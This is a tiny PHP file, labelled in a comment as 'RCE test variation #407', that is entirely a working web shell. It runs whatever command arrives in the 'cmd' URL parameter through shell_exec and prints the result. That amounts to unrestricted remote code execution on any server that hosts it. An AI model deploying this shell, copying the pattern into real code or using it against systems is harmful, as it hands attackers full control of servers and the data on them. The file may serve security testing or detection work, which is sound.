<?php
// RCE test variation #407
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>